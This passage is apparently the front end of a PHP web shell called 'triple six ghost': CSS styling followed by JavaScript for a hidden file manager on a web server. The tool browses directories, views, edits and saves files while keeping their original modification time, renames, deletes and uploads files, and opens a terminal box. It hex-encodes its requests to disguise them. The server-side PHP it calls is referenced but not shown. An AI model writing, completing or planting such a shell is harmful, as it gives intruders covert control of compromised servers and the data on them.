            0%  {transform: rotate(0deg);-ms-transform: rotate(0deg); -webkit-transform: rotate(0deg); -o-transform: rotate(0deg); -moz-transform: rotate(0deg);}
            100% {transform: rotate(360deg);-ms-transform: rotate(360deg); -webkit-transform: rotate(360deg); -o-transform: rotate(360deg); -moz-transform: rotate(360deg);}
        }

        @-webkit-keyframes rotate-loading {
            0%  {transform: rotate(0deg);-ms-transform: rotate(0deg); -webkit-transform: rotate(0deg); -o-transform: rotate(0deg); -moz-transform: rotate(0deg);}
            100% {transform: rotate(360deg);-ms-transform: rotate(360deg); -webkit-transform: rotate(360deg); -o-transform: rotate(360deg); -moz-transform: rotate(360deg);}
        }

        @-o-keyframes rotate-loading {
            0%  {transform: rotate(0deg);-ms-transform: rotate(0deg); -webkit-transform: rotate(0deg); -o-transform: rotate(0deg); -moz-transform: rotate(0deg);}
            100% {transform: rotate(360deg);-ms-transform: rotate(360deg); -webkit-transform: rotate(360deg); -o-transform: rotate(360deg); -moz-transform: rotate(360deg);}
        }

        @keyframes loading-text-opacity {
            0%  {opacity: 0}
            20% {opacity: 0}
            50% {opacity: 1}
            100%{opacity: 0}
        }

        @-moz-keyframes loading-text-opacity {
            0%  {opacity: 0}
            20% {opacity: 0}
            50% {opacity: 1}
            100%{opacity: 0}
        }

        @-webkit-keyframes loading-text-opacity {
            0%  {opacity: 0}
            20% {opacity: 0}
            50% {opacity: 1}
            100%{opacity: 0}
        }

        @-o-keyframes loading-text-opacity {
            0%  {opacity: 0}
            20% {opacity: 0}
            50% {opacity: 1}
            100%{opacity: 0}
        }
        .loading-container,
        .loading {
            height: 100px;
            position: fixed;
            width: 100px;
            border-radius: 100%;
        }


        .loading-container { 
            margin: 40px auto;
            display: none;
            top: 20pc;
            right: 45pc;
            background-color: #1D1E22;
        }

        .loading {
            border: 2px solid transparent;
            border-color: transparent #16558F transparent #16558F;
            -moz-animation: rotate-loading 1.5s linear 0s infinite normal;
            -moz-transform-origin: 50% 50%;
            -o-animation: rotate-loading 1.5s linear 0s infinite normal;
            -o-transform-origin: 50% 50%;
            -webkit-animation: rotate-loading 1.5s linear 0s infinite normal;
            -webkit-transform-origin: 50% 50%;
            animation: rotate-loading 1.5s linear 0s infinite normal;
            transform-origin: 50% 50%;
        }

        .loading-container:hover .loading {
            border-color: transparent #E45635 transparent #E45635;
        }
        .loading-container:hover .loading,
        .loading-container .loading {
            -webkit-transition: all 0.5s ease-in-out;
            -moz-transition: all 0.5s ease-in-out;
            -ms-transition: all 0.5s ease-in-out;
            -o-transition: all 0.5s ease-in-out;
            transition: all 0.5s ease-in-out;
        }

        #loading-text {
            -moz-animation: loading-text-opacity 2s linear 0s infinite normal;
            -o-animation: loading-text-opacity 2s linear 0s infinite normal;
            -webkit-animation: loading-text-opacity 2s linear 0s infinite normal;
            animation: loading-text-opacity 2s linear 0s infinite normal;
            color: #ffffff;
            font-family: "Helvetica Neue, "Helvetica", ""arial";
            font-size: 10px;
            font-weight: bold;
            margin-top: 45px;
            opacity: 0;
            position: absolute;
            text-align: center;
            text-transform: uppercase;
            top: 0;
            width: 100px;
        }

        .alertArea {
            max-height: 100%;
            z-index: 99;
            position: fixed;
            top: 50px;
            left: 20px;
            right: 20px;
        }

        .alertBox {
            font-size: 16px;
            color: white;
            background: rgba(0, 0, 0, 0.9);
            line-height: 1.3em;
            padding: 10px 15px;
            margin: 5px 10px;
            position: relative;
            border-radius: 4px;
            transition: opacity 0.5s ease-in;
        }

        .success {
            background: #C3F3D7;
            border-left: 7px solid #24AD5D;
            color: #24AD5D;
        }

        .failed {
            background: #FFE0E3;
            border-left: 7px solid #FF4858;
            color: #FF4858;
        }

        .warning {
            background: #FFDB9B;
            border-left: 7px solid #FFA503;
            color: #FFA503;
        }

        .alertBox.hide {
            opacity: 0;
        }

        .alertClose {
            padding: 10px;
            width: 12px;
            height: 12px;
            position: absolute;
            top: 15px;
            right: 15px;
        }

        .alertClose:before,
        .alertClose:after {
            content: '';
            width: 15px;
            border-top: solid 2px white;
            position: absolute;
            top: 5px;
            right: -1px;
            display: block;
        }

        .alertClose:before {
            transform: rotate(45deg);
        }

        .alertClose:after {
            transform: rotate(135deg);
        }

        .alertClose:hover:before,
        .alertClose:hover:after {
            border-top: solid 2px #d8d8d8;
        }

        @media (max-width: 767px) and (min-width: 481px) {
            .alertArea {
                left: 100px;
                right: 100px;
            }
        }

        @media (min-width: 768px) {
            .alertArea {
                width: 350px;
                left: auto;
                right: 0;
            }
        }

        .alert-message-container {
            text-align: center;
            line-height: 2.5em;
            margin-top: 50px;
        }

        .alert-message-box {
            font-size: 20px;
            width: 300px;
            border: solid 1px #444;
            padding: 10px 15px;
            outline: none;
            transition: box-shadow 0.1s;
        }

        .alert-message-box:focus {
            box-shadow: 0 0 15px 2px #888;
        }

        .alert-message-button {
            font-size: 18px;
            color: white;
            background: #14b9ff;
            width: 250px;
            border: solid 1px #14b9ff;
            padding: 10px 20px;
            margin-top: 5px;
            cursor: pointer;
            outline: none;
            transition: background 0.1s;
        }

        .alert-message-button:hover,
        .alert-message-button:focus,
        .alert-message-button:active {
            background: #7dd8ff;
        }

        .centered {
            position: absolute;
            left:0;
            width: 100%;
            height: 75%;
            font-size: 18px;
        }

        .box {
            position: absolute;
            top: 20%;
            left: 37%;
            z-index: 101;
            border: 3px solid #202124;
            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.07), 0 2px 4px rgba(0, 0, 0, 0.07), 0 4px 8px rgba(0, 0, 0, 0.07), 0 8px 16px rgba(0, 0, 0, 0.07), 0 16px 32px rgba(0, 0, 0, 0.07), 0 32px 64px rgba(0, 0, 0, 0.07);
            background-color: #202124;
            border-radius: 5px;
            border-radius: 5px;
            width: 400px;
        }

        .close {
            background-color: red;
        }

        .dot {
            float: left;
            height: 12px;
            width: 12px;
            background-color: lime;
            margin-right:1px;
            border-radius: 50%;
            display: inline-block;
        }

        .floatRight {float: right;}

        .boxResult {text-align: center;}

        .width100 {width: 100%;}

        input[type=text].action {
            width: 95%;
            color: #b6c7d6;
            background: #22303c;
            border-radius: 5px;
            outline: none;
            border: none;
            padding: 10px;
        }

        .top {
            height: 10px;
            padding: 10px;
            padding-bottom: 15px;
            background: #202124;
            margin: 0;
            border-top-left-radius: 5px;
            border-top-right-radius: 5px;
        }

</style>
<body>
    <div class="alertArea"></div>
    <nav id="navbar" class="">
        <div class="nav-wrapper">
            <div class="logo">
                <a class="home">triple six ghost</a>
            </div>

            <ul id="menu">
                <li><a class="terminal">Terminal</a></li>
                <li><a class="about">About</a></li>
                <li><a class="logout">Logout</a></li>
            </ul>
        </div>
    </nav><br><br><br>
    <div class="loading-container">
        <div class="loading"></div>
        <div id="loading-text">loading</div>
    </div>
    <div class="serverInfo">
        <?php echo serverInfo() ?>
        <div id="pwd"></div>        
    </div>
    <div class="showBox"></div>
    <div id="explorer"></div>
    <div class="uploadFile"></div>
    <script>
        var xhr = new XMLHttpRequest();
        var home = "<?php echo bin2hex($MINERVA['HOME']) ?>";
        var explorer = document.getElementById("explorer");
        var pwd = document.getElementById("pwd")
        var cwd = "<?php echo $tabsContent ?>";
        var validation = "";
        actionClick();

        if (window.history.replaceState) {
            window.history.replaceState(null,null,window.location.href);
        }

        if(!window.unescape){
            window.unescape = function(s){
                return s.replace(/%([0-9A-F]{2})/g, function(m, p) {
                    return String.fromCharCode('0x' + p);
                });
            };
        }
        <?php echo $MINERVA['HEX'] ?>

        navigate(cwd);

        function basename(path) {
            return path.substring(path.lastIndexOf('/') + 1)
        }

        function hideBox() {
            if (document.querySelector(".box") != null) {
                document.querySelector(".box").remove();
            }
        }

        function showBox(contents) {
            content = '<center><div class="box">'+
            '<div class="top">'+
            '<span class="dot back"></span>'+
            '<span class="dot back"></span>'+
            '<span class="dot back"></span>'+
            '<span class="dot floatRight" style="background:red;" onclick="hideBox();">'+
            '</span>'+
            '</div>'+
            '<div class="content">'+
            '<table width="100%" class="tableAction">'+
            contents
            +'<td colspan="2">'+
            '<div class="boxResult"></div>'+
            '</td>'+
            '</tr>'+
            '</table></div></div></center>';

            document.querySelector(".showBox").innerHTML = content;

            actionClick();
        }

        function showAlert(msg, type) {
            if (msg === ''  || typeof msg === 'undefined' || msg === null) {
                showAlert("put message in here", "warning");
            }
            else {
                var alertArea = document.querySelector(".alertArea");
                var alertBox = document.createElement('div');
                var alertContent = document.createElement('div');
                var alertClose = document.createElement('span');
                alertContent.classList.add('alert-content');
                alertContent.innerHTML = "<b>"+msg+"</b>";
                alertClose.classList.add('alertClose');
                alertBox.classList.add('alertBox');

                if (type == "success") {
                    alertBox.classList.add('success');
                } else if (type == "failed") {
                    alertBox.classList.add('failed');
                } else if (type == "warning") {
                    alertBox.classList.add('warning');
                }

                alertBox.appendChild(alertContent);
                if (!false || typeof false === 'undefined') {
                    alertBox.appendChild(alertClose);
                }
                alertArea.appendChild(alertBox);
                alertClose.addEventListener('click', function(event) {
                    event.preventDefault();
                    hideAlert(alertBox);
                });

                if (!false) {
                    var alertTimeout = setTimeout(function() {
                        hideAlert(alertBox);
                        clearTimeout(alertTimeout);
                    }, 5000);
                }
            }
        };

        function hideAlert(alertBox) {
            alertBox.classList.add('hide');
            alertBox.parentNode.removeChild(alertBox);
        };

        function cwd() {
            return getCookie("cwd");
        }

        function print(str) {
            console.log(str);
        }

        function navigate(path) {
            action = "<?php echo bin2hex('chdir') ?>";
            data = {
                "path" : path, 
                "action" : action
            };

            sendPost(JSON.stringify(data), function() {
                response = JSON.parse(hex2bin(xhr.responseText));
                if (response != "failed") {
                        output = "";
                        output += "<table class='content-table' align='center' width='100%'>"+
                                        "<thead>"+
                                            "<tr>"+
                                                "<th>Filename</th>"+
                                                "<th>Size</th>"+
                                                "<th>Date Modified</th>"+
                                                "<th>Permissions</th>"+
                                                "<th>Ownership</th>"+
                                                "<th>Action</th>"+
                                            "</tr>"+
                                        "</thead>"+
                                        "<tbody>";
                        for (var i = 0; i < response.dirname.length; i++) {
                            if (response.dirname[i][0] == hex2bin(getCookie('cwd'))+"/..") {
                                output += "<tr class='hover' data-path='"+bin2hex(response.path)+"' data-type='"+response.dirname[i][7]+"'>"+
                                            "<td><span class='cd'><img class='icon_previous'>"+response.dirname[i][1]+"</span></td>"+
                                            "<td>"+response.dirname[i][2]+"</td>"+
                                            "<td>"+response.dirname[i][3]+"</td>"+
                                            "<td>"+response.dirname[i][4]+"</td>"+
                                            "<td>"+response.dirname[i][5]+"</td>"+
                                            "<td>"+response.dirname[i][6]+"</td>"+
                                        "</tr>";
                            } else {
                                output += "<tr class='hover' data-path='"+bin2hex(response.dirname[i][0])+"' data-type='"+response.dirname[i][7]+"'>"+
                                            "<td><span class='cd'><img class='icon_folder'>"+response.dirname[i][1]+"</span></td>"+
                                            "<td>"+response.dirname[i][2]+"</td>"+
                                            "<td>"+response.dirname[i][3]+"</td>"+
                                            "<td>"+response.dirname[i][4]+"</td>"+
                                            "<td>"+response.dirname[i][5]+"</td>"+
                                            "<td>"+response.dirname[i][6]+"</td>"+
                                        "</tr>";
                            }
                        }

                        for (var i = 0; i < response.filename.length; i++) {
                            switch(response.filename[i][8]) {
                                case 'jpg':
                                case 'jpeg':
                                case 'png':
                                case 'gif':
                                case 'rar':
                                case 'zip':
                                case 'mp3':
                                case 'mp4':
                                    actionButton = response.filename[i][9];
                                    break;
                                default:
                                    actionButton = response.filename[i][6];
                            } actionButton = actionButton;
                            output += "<tr class='hover' data-path='"+bin2hex(response.filename[i][0])+"' data-type='"+response.filename[i][7]+"'>"+
                                            "<td><span class='ViewFile'><img class='icon_file'>"+response.filename[i][1]+"</span></td>"+
                                            "<td>"+response.filename[i][2]+"</td>"+
                                            "<td>"+response.filename[i][3]+"</td>"+
                                            "<td>"+response.filename[i][4]+"</td>"+
                                            "<td>"+response.filename[i][5]+"</td>"+
                                            "<td>"+actionButton+"</td>"+
                                        "</tr>";
                        }

                        explorer.innerHTML = output;
                        pwd.innerHTML = "Current Dir : "+response.pwd;
                        actionClick();
                    }
                });
        }

        function viewFile(path, type) {
            action = "<?php echo bin2hex("viewFile") ?>";
            data = {
                "path" : path, 
                "action" : action,
                "type" : type
            };

            switch(type) {
                case "view":
                   textareaType = "readonly";
                   btnSave = "";
                break;
                case "edit":
                    textareaType = "";
                    btnSave = "<span class='action save'>Save</span>";
                break;
            }

            sendPost(JSON.stringify(data), function() {
                response = JSON.parse(hex2bin(xhr.responseText));
                if (response != "failed") {
                    path = response.path;
                    output = "";
                    output += "<table class='content-table' align='center' width='100%' style='border:none;'>"+
                                    "<tbody class='viewFile' data-path='"+bin2hex(path)+"'>"+
                                        "<tr>"+
                                            "<td style='width:100px;'>Filename</td>"+
                                            "<td style='width:10px;'>:</td>"+
                                            "<td style='float:left;text-align:left;'>"+response.viewFile[0]+"</td>"+
                                            "<td rowspan='5' style='width:500px;'><div class='resultBox'></div></td>"+
                                        "</tr>"+
                                        "<tr>"+
                                            "<td style='width:100px;'>Size</td>"+
                                            "<td style='width:10px;'>:</td>"+
                                            "<td style='float:left;text-align:left;'>"+response.viewFile[1]+"</td>"+
                                        "</tr>"+
                                        "<tr>"+
                                            "<td style='width:100px;'>Date Modified</td>"+
                                            "<td style='width:10px;'>:</td>"+
                                            "<td style='float:left;text-align:left;'>"+response.viewFile[2]+"</td>"+
                                            "<input type='hidden' class='filetime' value='"+response.viewFile[2]+"'>"+
                                        "</tr>"+
                                        "<tr>"+
                                            "<td style='width:100px;'>Permissions</td>"+
                                            "<td style='width:10px;'>:</td>"+
                                            "<td style='float:left;text-align:left;'>"+response.viewFile[3]+"</td>"+
                                        "</tr>"+
                                        "<tr>"+
                                            "<td style='width:100px;'>Ownership</td>"+
                                            "<td style='width:10px;'>:</td>"+
                                            "<td style='float:left;text-align:left;'>"+response.viewFile[4]+"</td>"+
                                        "</tr>"+
                                        "<tr>"+
                                            "<td colspan='4'><textarea "+textareaType+" class='content'>"+response.viewFile[5]+"</textarea></td>"+
                                        "</tr>"+
                                        "<tr>"+
                                            "<td colspan='4'>"+btnSave+"</td>"+
                                        "</tr>"+
                                        "<tr>"+
                                            "<td colspan='4'></td>"+
                                        "</tr>"+
                                    "</tbody>"+
                                "</table>";

                    explorer.innerHTML = output;
                    pwd.innerHTML = "Current Dir : "+response.pwd;
                    actionClick();

                    if (type == "edit") {
                        if (validation == "success") {
                            showAlert("Saved ! ", "success");
                        } else if(validation == "failed") {
                            showAlert("Failed !", "failed");
                        }
                    } validation = "";
                }
            });
        }

        function saveFile(path, content) {
            actionSave = "<?php echo bin2hex("writeFile") ?>";
            content = document.querySelector(".content").value;
            time = document.querySelector(".filetime").value;
            dataSave = {
                "path" : path,
                "action" : actionSave,
                "content" : bin2hex(content),
                "time" : bin2hex(time),
            }

            validation = false;

            sendPost(JSON.stringify(dataSave), function() {
                response = JSON.parse(hex2bin(xhr.responseText));
                if (response.status == "success") {
                    validation = "success";
                    viewFile(path, "edit");
                } else {
                    validation = "failed";
                    viewFile(path, "edit");
                }
            });
        }

        function renameFile(path, btn) {
            action = "<?php echo bin2hex("renameFiles") ?>";

            if (getDataPath(btn, "data-type") == "dir") {
                inputDir = "";
                inputDir += '<input type="text" class="input newName" value="'+basename(hex2bin(path))+'">';
                inputDir += "<span><span class='renameAction'>rename</span><span class='cancel'>Cancel</span></span>";
                output = btn.parentElement.parentElement.children[0].innerHTML = "<img class='icon_folder'>"+inputDir+"";
            } else if (getDataPath(btn, "data-type") == "file") {
                inputFile = "";
                inputFile += '<input type="text" class="input newName" value="'+basename(hex2bin(path))+'">';
                inputFile += "<span><span class='renameAction'>rename</span><span class='cancel'>Cancel</span></span>";
                output = btn.parentElement.parentElement.children[0].innerHTML = "<img class='icon_file'>"+inputFile+"";
            }

            newName = document.querySelector(".newName");
            renameAction = document.querySelector(".renameAction");
            cancel = document.querySelector(".cancel");

            renameAction.addEventListener("click", () => {
                data = {
                    "path" : path,
                    "action" : action,
                    "newname" : bin2hex(newName.value),
                };
                sendPost(JSON.stringify(data), function() {
                    response = JSON.parse(hex2bin(xhr.responseText));
                    if (response.status == "success") {
                        showAlert("Renamed ! ", "success");
                        renameFile(bin2hex(response.newname), btn);
                    } else {
                        showAlert("Rename Failed ! ", "failed");
                        renameFile(path, btn);
                    }
                });
            });

            cancel.addEventListener("click", () => {
                navigate(getCookie("cwd"));
            });
        }

        function deleteFiles(path) {
            action = "<?php echo bin2hex("deleteFiles") ?>";
            data = {
                "path" : path,
                "action" : action,
            };

            sendPost(JSON.stringify(data), function() {
                response = JSON.parse(hex2bin(xhr.responseText));
                    if (response.status == "success") {
                        showAlert(" Deleted ! ", "success");
                        navigate(bin2hex(response.path));
                    } else {
                        showAlert("Permission Danied ! ", "failed");
                    }
            });
        }

        function uploadFile(path) {
            action = "<?php echo bin2hex("uploadFile") ?>";

            content = ""+
                        "<tr>"+
                                "</td>"+
                                        "<input class='input' style='width:90%;' type='text' id='destination' required='required' value='"+hex2bin(path)+"'>"+
                                "</td>"+
                        "</tr>"+
                        "<tr>"+
                                "</td>"+
                                        "<input type='file' id='uploadFile' name='files' multiple><button class='uploadSubmit'>UPLOAD</button>"+
                                "</td>"+
                        "</tr>";

            showBox(content);

            document.querySelector(".uploadSubmit").addEventListener("click", function(event) {
                event.preventDefault();
                formUpload = new FormData();
                filename = document.getElementById("uploadFile").files;
                destination = document.getElementById("destination").value;

                formUpload.append("path", path);
                formUpload.append("action", action);
                formUpload.append("destination", bin2hex(destination));

                for (var i = 0; i < filename.length; i++) {
                    formUpload.append("files[]", filename[i]);
                }

                var loadingStart = () => {
                    loadingStart = document.querySelector(".loading-container");
                    loadingStart.style.display = "block";
                }
                var loadingStop = () => {
                    loadingStop = document.querySelector(".loading-container");
                    loadingStop.style.display = "none";
                }

                loadingStart();
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === XMLHttpRequest.DONE) {
                        const status = xhr.status;
                        if (status === 0 || (status >= 200 && status < 400)) {
                            response = JSON.parse(hex2bin(xhr.responseText));
                            if (response.status == "success") {
                                showAlert(response.fileUploaded+" File Uploaded !", "success");
                                navigate(bin2hex(response.path));
                                uploadFile(bin2hex(response.path));
                                console.log(response);
                            } else if (response.status == null) {
                                showAlert("No Data Uploaded !", "failed")
                            } else {
                                showAlert("Upload Failed !", "failed");
                            }
                            loadingStop();
                        } else {
                            print("error")
                            loadingStop();
                        }
                    }
                }
                xhr.open("POST", ''); 
                xhr.send(formUpload);
            });
        }

        function logout() {
            action = "<?php echo bin2hex("logout") ?>";
            data = {
                "path" : home,
                "action" : action
            }

            sendPost(JSON.stringify(data), function() {
                response = JSON.parse(hex2bin(xhr.responseText));
                window.location.reload();
            });
            window.location.reload();
        }

        function sendPost(dataPost, callback) {
            var loadingStart = () => {
                loadingStart = document.querySelector(".loading-container");
                loadingStart.style.display = "block";
            }

            var loadingStop = () => {
                loadingStop = document.querySelector(".loading-container");
                loadingStop.style.display = "none";
            }
            loadingStart();
            xhr.onreadystatechange = function() {
                if (xhr.readyState === XMLHttpRequest.DONE) {
                    const status = xhr.status;
                    if (status === 0 || (status >= 200 && status < 400)) {
                        callback();
                        loadingStop();
                    } else {
                        print("error")
                        loadingStop();
                    }
                }
            }
            xhr.open("POST", "<?= FILE_SELF ?>", true);
            xhr.setRequestHeader("Content-Type", "application/json; charset=UTF-8");
            xhr.send(dataPost);
        }

        function setCookie(cookieName, cookieValue){
            document.cookie = cookieName + '=' + encodeURIComponent(cookieValue);
        }

        function getCookie(cname) {
            let name = cname + "=";
            let decodedCookie = decodeURIComponent(document.cookie);
            let ca = decodedCookie.split(';');
            for(let i = 0; i <ca.length; i++) {
                let c = ca[i];
                while (c.charAt(0) == ' ') {
                c = c.substring(1);
                }
                if (c.indexOf(name) == 0) {
                    return c.substring(name.length, c.length);
                }
            } return "";
        }

        function getDataPath(data, path) {
                return data.parentElement.parentElement.getAttribute(path).split("\\").join("/");
            }

        function actionClick() {
            var inputRename = false;

            var terminalInput = document.querySelector(".terminalInput");

            var btnHome = document.querySelector(".home");
            var btnSave = document.querySelector(".save");
            var btnTerminal = document.querySelector(".terminal");
            var contentSave = document.querySelector(".content");
            var fileTime = document.querySelector(".filetime");
            var btnDisable = document.querySelectorAll(".disable");
            var btnPwd = document.querySelectorAll(".pwd");
            var btnUpload = document.querySelectorAll(".upload");
            var btnMakeFiles = document.querySelectorAll(".makeFiles");
            var btnChdir = document.querySelectorAll(".cd");
            var btnViewFile = document.querySelectorAll(".ViewFile");
            var btnEdit = document.querySelectorAll(".edit");
            var btnRename = document.querySelectorAll(".rename");
            var btnDelete = document.querySelectorAll(".delete");

            btnTerminal.addEventListener("click", function(event) {
                content = "<pre id='terminalOutput'></pre>"+
                                "<table id='terminalPrompt'>"+
                                    "<tr>"+
                                        "<td class='colFit'>"+
                                            "<span id='terminalCwd' class='strong'><?php echo cwd() ?>&gt;</span>"+
                                        "</td>"+
                                        "<td id='terminalCommand'>"+
                                            "<input type='text' class='terminalInput' class='floatLeft' spellcheck='false'>"
                                        "</td>"+
                                    "</tr>"+
                                "</table>";

                showBox(content);
            });

            if (terminalInput) {
                terminalInput.addEventListener("keydown", function(event) {
                    if (event.keyCode == 13) {
                        document.querySelector("#terminalPrompt").innerHTML = this.value;
                    }
                });
            }

            btnHome.addEventListener("click", function() {
                navigate(home);
            });

            document.querySelector(".logout").addEventListener("click", function(event) {
                event.preventDefault();
                logout();
            })

            if (btnSave) {
                btnSave.addEventListener("click", function() {
                    if (contentSave || fileTime) {
                        path = getDataPath(this.parentElement, "data-path");
                        saveFile(path, bin2hex(contentSave.value));
                    }
                });
            }

            for (var i = btnUpload.length - 1; i >= 0; i--) {
                btnUpload[i].addEventListener("click", () => {
                    path = getCookie('cwd');
                    uploadFile(path);
                });
            }

            for (var i = btnMakeFiles.length - 1; i >= 0; i--) {
                btnMakeFiles[i].addEventListener("click", () => {
                    path = getCookie('cwd');
                    print(path);
                });
            }

            for (var i = 0; i < btnPwd.length; i++) {
                btnPwd[i].addEventListener("click", function() {
                    path = bin2hex(this.getAttribute("data-path"));
                    navigate(path);
                    hideBox();
                });
            }

            for (var i = 0; i < btnChdir.length; i++) {
                btnChdir[i].addEventListener("click", function() {
                    path = getDataPath(this, "data-path");
                    navigate(path);
                    hideBox()
                });
            }

            for (var i = 0; i < btnViewFile.length; i++) {
                btnViewFile[i].addEventListener("click", function() {
                    path = getDataPath(this, "data-path");
                    viewFile(path, "view");
                });
            }

            for (var i = 0; i < btnEdit.length; i++) {
                btnEdit[i].addEventListener("click", function() {
                    path = getDataPath(this, "data-path");
                    viewFile(path, "edit");
                });
            }

            for (var i = 0; i < btnRename.length; i++) {
                btnRename[i].addEventListener("click", function() {
                    path = getDataPath(this, "data-path");
                    if (inputRename) {
                        navigate(getCookie("cwd"))
                    } else {
                        inputRename = this.parentElement.parentElement.children[0].innerHTML;
                        renameFile(path, this);
                    }
                });
            }

            for (var i = 0; i < btnDelete.length; i++) {
                btnDelete[i].addEventListener("click", function() {
                    path = getDataPath(this, "data-path");
                    deleteFiles(path);
                });
            }

        }
    </script>

</body>
</html>